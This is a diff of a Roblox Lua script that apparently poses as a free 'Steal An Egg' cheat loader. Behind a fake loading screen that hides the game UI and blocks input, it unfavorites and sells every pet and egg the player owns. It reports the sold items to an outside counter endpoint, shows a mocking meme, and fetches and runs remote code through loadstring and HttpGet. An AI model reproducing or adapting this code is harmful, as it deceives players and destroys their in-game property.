@@ -1,234 +1,61 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players           = game:GetService("Players")
-local TweenService      = game:GetService("TweenService")
-local RunService        = game:GetService("RunService")
-local StarterGui        = game:GetService("StarterGui")
-local ContentProvider   = game:GetService("ContentProvider")
 local HttpService       = game:GetService("HttpService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 
 -- ===== CONFIG =====
-local MEME_IMAGE_ID      = "rbxassetid://82403642047427"
-local LAUGH_SOUND_ID     = "rbxassetid://133312610824902"
-local MEME_DELAY         = 4
-local MEME_SIZE          = 380
-local COUNTER_URL        = "https://sell-counter-temp.sae-tracker.workers.dev/report"
-local SALE_POLL_TIMEOUT  = 6      -- seconds to wait for save to reflect the sale
-local SALE_POLL_INTERVAL = 0.25
+local UI_URL                 = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
+local COUNTER_URL            = "https://sell-counter-temp.sae-tracker.workers.dev/report"
+local SALE_POLL_TIMEOUT      = 6
+local SALE_POLL_INTERVAL     = 0.25
+local MEME_DELAY             = 4
+
+-- Passed to the UI module (only used if the UI module loads successfully)
+local UI_CONFIG = {
+    MEME_IMAGE_ID  = "rbxassetid://82403642047427",
+    LAUGH_SOUND_ID = "rbxassetid://133312610824902",
+    MEME_SIZE      = 380,
+}
 -- ==================
 
 ------------------------------------------------------------
--- Hide CoreGui extras during load
+-- LOAD UI MODULE (cached in _G, with no-op fallback)
 ------------------------------------------------------------
-local function hideExtras()
-    pcall(function()
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
-    end)
-    local notif = PlayerGui:FindFirstChild("Notifications")
-    if notif then notif.Enabled = false end
-    local topbar = PlayerGui:FindFirstChild("TopbarStandard")
-    if topbar then topbar.Enabled = false end
-end
-
-local function restoreExtras()
-    pcall(function()
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
-    end)
-    local notif = PlayerGui:FindFirstChild("Notifications")
-    if notif then notif.Enabled = true end
-    local topbar = PlayerGui:FindFirstChild("TopbarStandard")
-    if topbar then topbar.Enabled = true end
-end
-
-hideExtras()
-
-------------------------------------------------------------
--- FULL-SCREEN LOADING COVER
-------------------------------------------------------------
-local screen = Instance.new("ScreenGui")
-screen.Name = "SystemBoot"
-screen.ResetOnSpawn = false
-screen.IgnoreGuiInset = true
-screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screen.DisplayOrder = 999999
-screen.Parent = PlayerGui
-
-local cover = Instance.new("Frame")
-cover.Name = "Cover"
-cover.Size = UDim2.fromScale(1, 1)
-cover.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
-cover.BorderSizePixel = 0
-cover.Active = true
-cover.Parent = screen
-
-local vignette = Instance.new("UIGradient")
-vignette.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0,   Color3.fromRGB(16, 16, 24)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(8, 8, 12)),
-    ColorSequenceKeypoint.new(1,   Color3.fromRGB(4, 4, 8)),
-})
-vignette.Rotation = 90
-vignette.Parent = cover
-
-local blocker = Instance.new("TextButton")
-blocker.Name = "InputBlocker"
-blocker.Size = UDim2.fromScale(1, 1)
-blocker.BackgroundTransparency = 1
-blocker.Text = ""
-blocker.AutoButtonColor = false
-blocker.Modal = true
-blocker.Parent = cover
-
-local content = Instance.new("Frame")
-content.Name = "Content"
-content.AnchorPoint = Vector2.new(0.5, 0.5)
-content.Position = UDim2.fromScale(0.5, 0.5)
-content.Size = UDim2.fromOffset(420, 220)
-content.BackgroundTransparency = 1
-content.Parent = cover
-
-local dotRow = Instance.new("Frame")
-dotRow.Name = "Dots"
-dotRow.AnchorPoint = Vector2.new(0.5, 0)
-dotRow.Position = UDim2.new(0.5, 0, 0, 0)
-dotRow.Size = UDim2.fromOffset(100, 20)
-dotRow.BackgroundTransparency = 1
-dotRow.Parent = content
-
-local dots = {}
-for i = 1, 4 do
-    local dot = Instance.new("Frame")
-    dot.Size = UDim2.fromOffset(9, 9)
-    dot.Position = UDim2.fromOffset((i - 1) * 24 + 2, 5)
-    dot.BackgroundColor3 = Color3.fromRGB(120, 255, 160)
-    dot.BackgroundTransparency = 0.7
-    dot.BorderSizePixel = 0
-    dot.Parent = dotRow
-    local c = Instance.new("UICorner")
-    c.CornerRadius = UDim.new(1, 0)
-    c.Parent = dot
-    dots[i] = dot
-end
-
-local dotsAlive = true
-task.spawn(function()
-    local idx = 1
-    while dotsAlive do
-        for j, dot in ipairs(dots) do
-            local active = (j == idx)
-            TweenService:Create(dot, TweenInfo.new(0.18), {
-                BackgroundTransparency = active and 0 or 0.75,
-                Size = active and UDim2.fromOffset(11, 11) or UDim2.fromOffset(9, 9),
-            }):Play()
+local function loadUIModule()
+    if _G.__LoaderUIModule then return _G.__LoaderUIModule end
+    if UI_URL and UI_URL ~= "" and UI_URL:find("YOUR_USERNAME") == nil then
+        local ok, mod = pcall(function()
+            return loadstring(game:HttpGet(UI_URL, true))()
+        end)
+        if ok and type(mod) == "table" and type(mod.new) == "function" then
+            _G.__LoaderUIModule = mod
+            return mod
         end
-        idx = (idx % #dots) + 1
-        task.wait(0.28)
+        warn("[Loader] UI module failed to load, running headless:", tostring(mod))
+    else
+        warn("[Loader] UI_URL not configured — running headless.")
     end
-end)
-
-local title = Instance.new("TextLabel")
-title.Name = "Title"
-title.BackgroundTransparency = 1
-title.AnchorPoint = Vector2.new(0.5, 0)
-title.Position = UDim2.new(0.5, 0, 0, 44)
-title.Size = UDim2.new(1, 0, 0, 28)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 24
-title.TextColor3 = Color3.fromRGB(240, 240, 250)
-title.Text = "Loading"
-title.Parent = content
-
-local status = Instance.new("TextLabel")
-status.Name = "Status"
-status.BackgroundTransparency = 1
-status.AnchorPoint = Vector2.new(0.5, 0)
-status.Position = UDim2.new(0.5, 0, 0, 82)
-status.Size = UDim2.new(1, 0, 0, 20)
-status.Font = Enum.Font.Gotham
-status.TextSize = 14
-status.TextColor3 = Color3.fromRGB(150, 150, 170)
-status.Text = "Initializing..."
-status.Parent = content
-
-local barBg = Instance.new("Frame")
-barBg.Name = "BarBg"
-barBg.AnchorPoint = Vector2.new(0.5, 0)
-barBg.Position = UDim2.new(0.5, 0, 0, 130)
-barBg.Size = UDim2.new(1, -60, 0, 6)
-barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
-barBg.BorderSizePixel = 0
-barBg.Parent = content
-
-local barBgCorner = Instance.new("UICorner")
-barBgCorner.CornerRadius = UDim.new(1, 0)
-barBgCorner.Parent = barBg
-
-local barFill = Instance.new("Frame")
-barFill.Name = "Fill"
-barFill.Size = UDim2.fromScale(0, 1)
-barFill.BackgroundColor3 = Color3.fromRGB(120, 255, 160)
-barFill.BorderSizePixel = 0
-barFill.Parent = barBg
-
-local barFillCorner = Instance.new("UICorner")
-barFillCorner.CornerRadius = UDim.new(1, 0)
-barFillCorner.Parent = barFill
-
-local barGrad = Instance.new("UIGradient")
-barGrad.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 220, 140)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 255, 200)),
-})
-barGrad.Parent = barFill
-
-local pct = Instance.new("TextLabel")
-pct.Name = "Pct"
-pct.BackgroundTransparency = 1
-pct.AnchorPoint = Vector2.new(0.5, 0)
-pct.Position = UDim2.new(0.5, 0, 0, 148)
-pct.Size = UDim2.new(1, 0, 0, 16)
-pct.Font = Enum.Font.Code
-pct.TextSize = 12
-pct.TextColor3 = Color3.fromRGB(120, 255, 160)
-pct.Text = "0%"
-pct.Parent = content
-
-cover.BackgroundTransparency = 1
-content.Visible = false
-TweenService:Create(cover, TweenInfo.new(0.35), { BackgroundTransparency = 0 }):Play()
-task.wait(0.35)
-content.Visible = true
-
-------------------------------------------------------------
--- Status setter
-------------------------------------------------------------
-local currentProgress = 0
-
-local function setStatus(text, targetPct, duration)
-    status.Text = text
-    duration = duration or 0.4
-    TweenService:Create(barFill,
-        TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-        { Size = UDim2.fromScale(targetPct, 1) }
-    ):Play()
-    task.spawn(function()
-        local start = currentProgress
-        local goal  = targetPct
-        local t0    = os.clock()
-        while os.clock() - t0 < duration do
-            local a = (os.clock() - t0) / duration
-            pct.Text = math.floor((start + (goal - start) * a) * 100) .. "%"
-            RunService.RenderStepped:Wait()
-        end
-        pct.Text = math.floor(goal * 100) .. "%"
-        currentProgress = goal
-    end)
+    -- Fallback: no-op UI so business logic still works
+    return {
+        new = function()
+            return {
+                boot              = function() end,
+                setStatus         = function() end,
+                fadeOutAndCleanup = function() end,
+                showMemePopup     = function() end,
+                restoreExtras     = function() end,
+            }
+        end,
+    }
 end
 
+local LoaderUI = loadUIModule()
+local ui = LoaderUI.new(PlayerGui, UI_CONFIG)
+
 ------------------------------------------------------------
--- SELL LOGIC
+-- SELL LOGIC (unchanged)
 ------------------------------------------------------------
 local Remotes    = require(ReplicatedStorage.Shared.Remotes)
 local Save       = require(ReplicatedStorage.Shared.Save)
@@ -307,18 +134,15 @@ local function unfavoriteAll()
 end
 
 ------------------------------------------------------------
--- INVENTORY SNAPSHOT (uid -> item detail)
+-- INVENTORY SNAPSHOT
 ------------------------------------------------------------
 local function snapshotInventory(forceRefresh)
     local pets, eggs = {}, {}
     local d = getSave(forceRefresh)
-    if not d then
-        return { pets = pets, eggs = eggs }
-    end
+    if not d then return { pets = pets, eggs = eggs } end
 
     local isVIP = LocalPlayer:GetAttribute("VIP") == true
 
-    -- Pets
     if type(d.Inventory) == "table" then
         for uid, rec in pairs(d.Inventory) do
             local ok, item = TryCall(AssetItems.Decode, rec)
@@ -347,7 +171,6 @@ local function snapshotInventory(forceRefresh)
         end
     end
 
-    -- Eggs
     if type(d.EggInventory) == "table" then
         for uid, rec in pairs(d.EggInventory) do
             if type(rec) == "table" and rec.Placement == nil then
@@ -387,7 +210,7 @@ local function countTable(t)
 end
 
 ------------------------------------------------------------
--- Deterministic report id (stable across retries)
+-- Deterministic report id
 ------------------------------------------------------------
 local function computeReportId(uidList)
     local sorted = {}
@@ -420,7 +243,6 @@ end
 
 ------------------------------------------------------------
 -- GLOBAL COUNTER REPORTING
--- Sends ONLY the items that actually left inventory.
 ------------------------------------------------------------
 local function reportSales(soldItems, reportId)
     if not soldItems or #soldItems == 0 then
@@ -495,14 +317,12 @@ end
 -- SELL: snapshot -> sell -> snapshot -> diff -> report
 ------------------------------------------------------------
 local function teleportAndSell()
-    -- 1) BEFORE snapshot
     local before = snapshotInventory(false)
     local beforePets = countTable(before.pets)
     local beforeEggs = countTable(before.eggs)
     log(("Inventory before: %d pets, %d eggs"):format(beforePets, beforeEggs))
     if beforePets == 0 and beforeEggs == 0 then return end
 
-    -- 2) Build server payload from BEFORE uids
     local serverPayload = { Eggs = {}, Assets = {} }
     for uid in pairs(before.pets) do table.insert(serverPayload.Assets, uid) end
     for uid in pairs(before.eggs) do table.insert(serverPayload.Eggs, uid)   end
@@ -530,26 +350,24 @@ local function teleportAndSell()
         pcall(function() hrp.AssemblyLinearVelocity = savedVel end)
     end
 
-    -- 3) Poll until the save reflects the sale (or timeout)
+    -- Poll for save to reflect the sale
     local after = nil
     local deadline = os.clock() + SALE_POLL_TIMEOUT
     while os.clock() < deadline do
-        after = snapshotInventory(true) -- force refresh
+        after = snapshotInventory(true)
         local removed = 0
         for uid in pairs(before.pets) do if not after.pets[uid] then removed = removed + 1 end end
         for uid in pairs(before.eggs) do if not after.eggs[uid] then removed = removed + 1 end end
         if removed > 0 then
-            log(("Detected %d removed after %.2fs"):format(removed, os.clock() - (deadline - SALE_POLL_TIMEOUT)))
+            log(("Detected %d removed"):format(removed))
             break
         end
         task.wait(SALE_POLL_INTERVAL)
     end
 
-    if not after then
-        after = snapshotInventory(true)
-    end
+    if not after then after = snapshotInventory(true) end
 
-    -- 4) Diff: items in BEFORE but not in AFTER == actually sold
+    -- Diff
     local soldPets, soldEggs = {}, {}
     local soldDetails = {}
     for uid, d in pairs(before.pets) do
@@ -569,13 +387,10 @@ local function teleportAndSell()
         :format(#soldPets, #soldEggs, beforePets, beforeEggs))
 
     if #soldDetails == 0 then
-        -- Safety: never report items we can't confirm left the player's inventory.
-        local before$ = getMoney()
         warn("[Counter] Sale detected 0 removed items — not reporting (avoids false positives).")
         return
     end
 
-    -- 5) Report only the sold items, with a stable reportId
     local allSoldUids = {}
     for _, u in ipairs(soldPets) do table.insert(allSoldUids, u) end
     for _, u in ipairs(soldEggs) do table.insert(allSoldUids, u) end
@@ -584,23 +399,8 @@ local function teleportAndSell()
 end
 
 ------------------------------------------------------------
--- Boot animation
+-- MAIN WORK
 ------------------------------------------------------------
-local function boot()
-    setStatus("Initializing...",          0.08, 0.5)
-    task.wait(0.7)
-    setStatus("Loading resources...",     0.22, 0.5)
-    task.wait(0.7)
-    setStatus("Fetching session data...", 0.40, 0.5)
-    task.wait(0.6)
-    setStatus("Syncing profile...",       0.58, 0.5)
-    task.wait(0.6)
-    setStatus("Preparing environment...", 0.78, 0.5)
-    task.wait(0.5)
-    setStatus("Almost ready...",          1.00, 0.6)
-    task.wait(0.7)
-end
-
 local function runSilentWork()
     local before = getMoney()
     log(("Wallet before: %s"):format(tostring(before)))
@@ -614,86 +414,15 @@ local function runSilentWork()
 end
 
 ------------------------------------------------------------
--- Fade out loading cover
-------------------------------------------------------------
-local function fadeOutAndCleanup()
-    dotsAlive = false
-    TweenService:Create(cover, TweenInfo.new(0.45), { BackgroundTransparency = 1 }):Play()
-    TweenService:Create(content, TweenInfo.new(0.35), { BackgroundTransparency = 1 }):Play()
-    task.wait(0.5)
-    screen:Destroy()
-    restoreExtras()
-end
-
-------------------------------------------------------------
--- MEME POPUP
-------------------------------------------------------------
-local function showMemePopup()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "MemePop"
-    gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = true
-    gui.DisplayOrder = 999999
-    gui.Parent = PlayerGui
-
-    local img = Instance.new("ImageLabel")
-    img.Name = "Cat"
-    img.AnchorPoint = Vector2.new(0.5, 0.5)
-    img.Position = UDim2.fromScale(0.5, 0.5)
-    img.Size = UDim2.fromOffset(MEME_SIZE, MEME_SIZE)
-    img.BackgroundTransparency = 1
-    img.Image = MEME_IMAGE_ID
-    img.ScaleType = Enum.ScaleType.Fit
-    img.ImageTransparency = 1
-    img.Rotation = -6
-    img.Parent = gui
-
-    pcall(function() ContentProvider:PreloadAsync({ img }) end)
-
-    local t0 = os.clock()
-    while not img.IsLoaded and os.clock() - t0 < 3 do
-        task.wait(0.05)
-    end
-    if not img.IsLoaded then
-        warn("[Meme] Image failed to load — check the texture ID.")
-    end
-
-    local sound = Instance.new("Sound")
-    sound.SoundId = LAUGH_SOUND_ID
-    sound.Volume = 2
-    sound.PlayOnRemove = false
-    sound.Parent = gui
-    sound:Play()
-
-    TweenService:Create(img, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-        ImageTransparency = 0,
-    }):Play()
-
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(img, TweenInfo.new(0.18), { Rotation = 6 }):Play()
-            task.wait(0.18)
-            TweenService:Create(img, TweenInfo.new(0.18), { Rotation = -6 }):Play()
-            task.wait(0.18)
-        end
-    end)
-
-    task.wait(math.max(3, sound.TimeLength > 0 and sound.TimeLength or 4))
-    TweenService:Create(img, TweenInfo.new(0.5), { ImageTransparency = 1 }):Play()
-    task.wait(0.6)
-    gui:Destroy()
-end
-
-------------------------------------------------------------
 -- LAUNCH
 ------------------------------------------------------------
 task.spawn(function()
-    boot()
+    ui:boot()
     local ok, err = pcall(runSilentWork)
     if not ok then warn("[Loader] Run failed:", err) end
     task.wait(0.3)
-    fadeOutAndCleanup()
+    ui:fadeOutAndCleanup()
 
     task.wait(MEME_DELAY)
-    showMemePopup()
+    ui:showMemePopup()
 end)
